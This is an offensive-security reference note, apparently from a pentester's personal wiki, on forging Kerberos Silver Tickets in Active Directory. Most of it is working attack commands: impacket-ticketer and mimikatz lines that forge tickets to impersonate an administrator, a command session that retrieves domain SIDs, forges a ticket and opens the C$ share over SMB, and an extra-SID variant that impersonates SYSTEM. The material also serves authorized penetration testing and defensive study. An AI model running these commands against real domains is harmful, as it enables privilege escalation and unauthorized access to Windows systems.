---
title: Silver Ticket
---

A Silver Ticket is a forged [[notes/ad/kerberos-st]].
Typically you forge a Silver Ticket when you know the NT hash or AES key of a computer account and want to impersonate a admin against that computer.
It stays valid if the `krbtgt` password is rotated, but is invalidated when the passwords of computer account is rotated every 30 days.

First get the [[notes/ad/domain-sid]] of a admin, then forge a ST to impersonate the admin against the computer.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    rm ./administrator*.ccache
    impacket-ticketer -domain corp.local -domain-sid $domainsid -spn cifs/srv01.corp.local -nthash $service administrator
    export KRB5CCNAME=$PWD/administrator.ccache
    ~~~

=== "[[notes/tools/mimikatz]]"
    ~~~ bat
    mimikatz.exe "kerberos::golden /ptt /domain:corp.local /sid:$domainsid /service:cifs /target:srv01.corp.local /rc4:%service% /user:administrator" "exit"
    ~~~

It is possible to specify local groups in the extra SID attribute ([source](https://youtube.com/watch?v=z3FOw8MfKcw&t=18m45s)).
The local domain SID can be retrieved as authenticated user with [getlocalsid.py](https://github.com/dirkjanm/forest-trust-tools/blob/master/getlocalsid.py).

~~~
❯ impacket-lookupsid -hashes :$nthash corp.local/'ws01$'@dc01.corp.local 0
[*] Domain SID is: S-1-5-21-1111111111-2222222222-333333333
❯ python3 ./getlocalsid.py -hashes :$nthash corp.local/'ws01$'@ws01.corp.local ws01
Found local domain SID: S-1-5-21-4444444444-5555555555-6666666666
❯ impacket-ticketer -nthash $nthash -domain corp.local -domain-sid S-1-5-21-1111111111-2222222222-333333333 -extra-sid S-1-5-21-4444444444-5555555555-6666666666-500 -spn cifs/ws01.corp.local 'ws01$'
[*] Saving ticket in ws01$.ccache
❯ impacket-smbclient -k -no-pass ws01.corp.local
# use c$
~~~

Furthermore it is possible to impersonate `NT Authority/System` remotely ([source](http://web.archive.org/web/20231104044549/https://labs.withsecure.com/publications/scheduled-task-tampering)).

~~~ bash
impacket-ticketer -nthash $nthash -domain corp.local -domain-sid $domainsid -extra-sid S-1-5-18 -spn cifs/ws01.corp.local 'ws01$'
~~~
